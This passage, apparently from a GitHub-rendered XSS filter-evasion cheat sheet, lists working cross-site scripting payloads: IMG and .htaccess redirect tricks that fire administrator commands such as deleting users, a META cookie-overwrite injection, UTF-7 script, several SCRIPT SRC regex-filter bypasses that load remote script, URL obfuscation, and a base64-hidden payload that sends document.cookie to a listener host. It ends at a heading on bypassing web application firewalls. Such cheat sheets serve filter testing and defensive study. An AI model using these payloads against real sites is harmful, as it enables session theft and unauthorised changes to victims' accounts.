<h2><a id="user-content-img-embedded-commands" class="anchor" aria-hidden="true" href="#img-embedded-commands"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IMG Embedded commands</h2>
<p>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:</p>
<pre><code>&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
</code></pre>
<h3><a id="user-content-img-embedded-commands-part-ii" class="anchor" aria-hidden="true" href="#img-embedded-commands-part-ii"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IMG Embedded commands part II</h3>
<p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):</p>
<pre><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
</code></pre>
<h2><a id="user-content-cookie-manipulation" class="anchor" aria-hidden="true" href="#cookie-manipulation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Cookie manipulation</h2>
<p>Admittedly this is pretty obscure but I have seen a few examples where <code>&lt;META</code> is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):</p>
<pre><code>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
</code></pre>
<h2><a id="user-content-utf-7-encoding" class="anchor" aria-hidden="true" href="#utf-7-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>UTF-7 encoding</h2>
<p>If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:</p>
<pre><code>&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
</code></pre>
<h2><a id="user-content-xss-using-html-quote-encapsulation" class="anchor" aria-hidden="true" href="#xss-using-html-quote-encapsulation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>XSS using HTML quote encapsulation</h2>
<p>This was tested in IE, your mileage may vary. For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>&lt;SCRIPT SRC...</code> by way of a regex filter <code>/\&lt;script\[^\&gt;\]+src/i</code>:</p>
<pre><code>&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>\&lt;script src...</code> by way of a regex filter <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> (this is an important one, because I've seen this regex in the wild):</p>
<pre><code>&lt;SCRIPT ="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>Another XSS to evade the same filter, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>:</p>
<pre><code>&lt;SCRIPT a="&gt;" '' SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>Yet another XSS to evade the same filter, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>. I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <code>&lt;SCRIPT&gt;</code> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <code>&lt;SCRIPT&gt;</code> tags):</p>
<pre><code>&lt;SCRIPT "a='&gt;'" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>And one last XSS attack to evade, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> using grave accents (again, doesn't work in Firefox):</p>
<pre><code>&lt;SCRIPT a=`&gt;` SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:</p>
<pre><code>&lt;SCRIPT a="&gt;'&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:</p>
<pre><code>&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</code></pre>
<h2><a id="user-content-url-string-evasion" class="anchor" aria-hidden="true" href="#url-string-evasion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>URL string evasion</h2>
<p>Assuming <code>http://www.google.com/</code> is programmatically disallowed:</p>
<h3><a id="user-content-ip-versus-hostname" class="anchor" aria-hidden="true" href="#ip-versus-hostname"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IP versus hostname</h3>
<pre><code>&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-url-encoding" class="anchor" aria-hidden="true" href="#url-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>URL encoding</h3>
<pre><code>&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-dword-encoding" class="anchor" aria-hidden="true" href="#dword-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DWORD encoding</h3>
<p>Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:</p>
<pre><code>&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-hex-encoding" class="anchor" aria-hidden="true" href="#hex-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Hex encoding</h3>
<p>The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):</p>
<pre><code>&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-octal-encoding" class="anchor" aria-hidden="true" href="#octal-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Octal encoding</h3>
<p>Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...:</p>
<pre><code>&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-base64-encoding" class="anchor" aria-hidden="true" href="#base64-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Base64 encoding</h3>
<pre><code>&lt;img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"&gt;
</code></pre>
<h3><a id="user-content-mixed-encoding" class="anchor" aria-hidden="true" href="#mixed-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Mixed encoding</h3>
<p>Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:</p>
<pre><code>&lt;A HREF="h 
tt  p://6	6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-protocol-resolution-bypass" class="anchor" aria-hidden="true" href="#protocol-resolution-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Protocol resolution bypass</h3>
<p><code>//</code> translates to <code>http://</code> which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like <code>(ht|f)tp(s)?://</code> (thanks to Ozh for part of this one). You can also change the <code>//</code> to <code>\\\\</code>. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</p>
<pre><code>&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-google-feeling-lucky-part-1" class="anchor" aria-hidden="true" href="#google-feeling-lucky-part-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Google "feeling lucky" part 1.</h3>
<p>Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's <code>keyword:</code> protocol. You can concatenate several keywords by using something like the following <code>keyword:XSS+RSnake</code> for instance. This no longer works within Firefox as of 2.0.</p>
<pre><code>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-google-feeling-lucky-part-2" class="anchor" aria-hidden="true" href="#google-feeling-lucky-part-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Google "feeling lucky" part 2.</h3>
<p>This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the "feeling lucky" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:</p>
<pre><code>&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-google-feeling-lucky-part-3" class="anchor" aria-hidden="true" href="#google-feeling-lucky-part-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Google "feeling lucky" part 3.</h3>
<p>This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the "feeling lucky" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case "google"):</p>
<pre><code>&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-removing-cnames" class="anchor" aria-hidden="true" href="#removing-cnames"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Removing CNAMEs</h3>
<p>When combined with the above URL, removing "<a href="http://www" rel="nofollow">www</a>." will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):</p>
<pre><code>&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;
</code></pre>
<p>Extra dot for absolute DNS:</p>
<pre><code>&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-javascript-link-location" class="anchor" aria-hidden="true" href="#javascript-link-location"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>JavaScript link location:</h3>
<pre><code>&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
</code></pre>
<h3><a id="user-content-content-replace-as-attack-vector" class="anchor" aria-hidden="true" href="#content-replace-as-attack-vector"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Content replace as attack vector</h3>
<p>Assuming <code>http://www.google.com/</code> is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: <code>java&amp;\#x09;script:</code> was converted into <code>java	script:</code>, which renders in IE, Netscape 8.1+ in secure site mode and Opera):</p>
<pre><code>&lt;A HREF="http://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;
</code></pre>
<h2><a id="user-content-character-escape-sequences" class="anchor" aria-hidden="true" href="#character-escape-sequences"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Character escape sequences</h2>
<p>All the possible combinations of the character "&lt;" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.</p>
<p><code>&lt;</code><br>
<code>%3C</code><br>
<code>&amp;lt</code><br>
<code>&amp;lt;</code><br>
<code>&amp;LT</code><br>
<code>&amp;LT;</code><br>
<code>&amp;#60</code><br>
<code>&amp;#060</code><br>
<code>&amp;#0060</code><br>
<code>&amp;#00060</code><br>
<code>&amp;#000060</code><br>
<code>&amp;#0000060</code><br>
<code>&amp;#60;</code><br>
<code>&amp;#060;</code><br>
<code>&amp;#0060;</code><br>
<code>&amp;#00060;</code><br>
<code>&amp;#000060;</code><br>
<code>&amp;#0000060;</code><br>
<code>&amp;#x3c</code><br>
<code>&amp;#x03c</code><br>
<code>&amp;#x003c</code><br>
<code>&amp;#x0003c</code><br>
<code>&amp;#x00003c</code><br>
<code>&amp;#x000003c</code><br>
<code>&amp;#x3c;</code><br>
<code>&amp;#x03c;</code><br>
<code>&amp;#x003c;</code><br>
<code>&amp;#x0003c;</code><br>
<code>&amp;#x00003c;</code><br>
<code>&amp;#x000003c;</code><br>
<code>&amp;#X3c</code><br>
<code>&amp;#X03c</code><br>
<code>&amp;#X003c</code><br>
<code>&amp;#X0003c</code><br>
<code>&amp;#X00003c</code><br>
<code>&amp;#X000003c</code><br>
<code>&amp;#X3c;</code><br>
<code>&amp;#X03c;</code><br>
<code>&amp;#X003c;</code><br>
<code>&amp;#X0003c;</code><br>
<code>&amp;#X00003c;</code><br>
<code>&amp;#X000003c;</code><br>
<code>&amp;#x3C</code><br>
<code>&amp;#x03C</code><br>
<code>&amp;#x003C</code><br>
<code>&amp;#x0003C</code><br>
<code>&amp;#x00003C</code><br>
<code>&amp;#x000003C</code><br>
<code>&amp;#x3C;</code><br>
<code>&amp;#x03C;</code><br>
<code>&amp;#x003C;</code><br>
<code>&amp;#x0003C;</code><br>
<code>&amp;#x00003C;</code><br>
<code>&amp;#x000003C;</code><br>
<code>&amp;#X3C</code><br>
<code>&amp;#X03C</code><br>
<code>&amp;#X003C</code><br>
<code>&amp;#X0003C</code><br>
<code>&amp;#X00003C</code><br>
<code>&amp;#X000003C</code><br>
<code>&amp;#X3C;</code><br>
<code>&amp;#X03C;</code><br>
<code>&amp;#X003C;</code><br>
<code>&amp;#X0003C;</code><br>
<code>&amp;#X00003C;</code><br>
<code>&amp;#X000003C;</code><br>
<code>\x3c</code><br>
<code>\x3C</code><br>
<code>\u003c</code><br>
<code>\u003C</code></p>
<h1><a id="user-content-methods-to-bypass-waf--cross-site-scripting" class="anchor" aria-hidden="true" href="#methods-to-bypass-waf--cross-site-scripting"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Methods to Bypass WAF – Cross-Site Scripting</h1>
<p>General issues</p>
<p>• Stored XSS</p>
